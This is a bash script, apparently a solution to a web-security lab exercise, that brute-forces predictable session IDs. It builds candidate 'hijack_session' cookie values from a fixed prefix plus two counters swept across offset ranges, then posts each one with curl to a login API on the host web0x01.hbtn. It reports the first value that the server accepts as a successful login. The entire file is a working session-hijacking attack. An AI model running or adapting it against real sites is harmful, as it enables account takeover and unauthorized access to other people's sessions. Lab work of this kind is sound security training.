#!/bin/bash

SESSION="tOZldT-nZMPCBBiT4FSQR3JnEZFrTZ_KmaPC2LBHBOU.BQ9ExPnRHpQ3WAfytSxOErOZpY4"
PFX="44040f20-e21d-4d0b-970"
A0=7608615
B0=17719253037

AOFF=-1500
while [ "$AOFF" -le 1500 ]
do
  A=$((A0 + AOFF))

  for BOFF in -2000 -1200 -800 -400 -200 -100 -50 0 50 100 200 400 800 1200 2000
  do
    B=$((B0 + BOFF))
    HIJ="$PFX-$A-$B"

    RES=$(curl -s \
      -H "Content-Type: application/json" \
      -H "Cookie: session=$SESSION; hijack_session=$HIJ" \
      -d '{"email":"a@a.com","password":"a"}' \
      http://web0x01.hbtn/api/a1/hijack_session/login)

    echo "$RES" | grep -q '"status":"success"'
    if [ "$?" -eq 0 ]
    then
      echo "FOUND $HIJ"
      echo "$RES"
      exit 0
    fi
  done

  AOFF=$((AOFF + 1))
done

echo "No success in stripes"
exit 1
